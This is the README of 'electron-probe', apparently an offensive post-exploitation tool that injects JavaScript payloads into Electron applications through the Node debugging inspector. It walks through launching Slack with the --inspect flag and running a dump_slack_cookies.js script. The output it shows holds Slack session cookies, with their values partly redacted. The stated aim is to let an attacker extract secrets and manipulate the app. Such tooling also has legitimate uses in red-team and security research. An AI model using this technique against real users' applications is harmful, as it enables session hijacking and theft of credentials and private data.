# electron-probe

Electron-Probe leverages the Node variant of the Chrome Debugging Protocol to execute JavaScript payloads inside of target Electron applications. This allows an attacker to extract secrets and manipulate the application as part of their post-exploitation workflow.

## Usage
Launch the Electron app target with the `--inspect` flag to start the V8 Inspector:
```
$ /Applications/Slack.app/Contents/MacOS/Slack --inspect

Debugger listening on ws://127.0.0.1:9229/b84df45f-b494-4e18-b77c-d8ed8f34c44d
For help, see: https://nodejs.org/en/docs/inspector
Initializing local storage instance
(node:82531) [DEP0005] DeprecationWarning: Buffer() is deprecated due to security and usability issues. Please use the Buffer.alloc(), Buffer.allocUnsafe(), or Buffer.from() methods instead.
(Use `Slack --trace-deprecation ...` to show where the warning was created)
[08/29/21, 19:12:21:841] info:
╔══════════════════════════════════════════════════════╗
║      Slack 4.18.0, darwin (Store) 20.6.0 on x64      ║
╚══════════════════════════════════════════════════════╝
```

Then, use electron-probe to inject your payloads: 

```
$ ./electron-probe -inspect-target http://localhost:9229 -script scripts/dump_slack_cookies.js | jq 

[
  [... SNIP]
    {
    "name": "ssb_instance_id",
    "value": "90d5538e- [ REDACTED ]",
    "domain": ".slack.com",
    "hostOnly": false,
    "path": "/",
    "secure": false,
    "httpOnly": false,
    "session": false,
    "expirationDate": 1945639889,
    "sameSite": "unspecified"
  },
  {
    "name": "d",
    "value": "aX9QnD8F [ REDACTED ]",
    "domain": ".slack.com",
    "hostOnly": false,
    "path": "/",
    "secure": true,
    "httpOnly": true,
    "session": false,
    "expirationDate": 1941391182.507454,
    "sameSite": "lax"
  },
 [ SNIP ]
]
```

There is a small set of example scripts in the `scripts` directory to get you started.

## TODO
I plan to add support very soon for packing payload scripts into `electron-probe` at build time using the Go [embed](https://pkg.go.dev/embed) package so that they're not separate files.
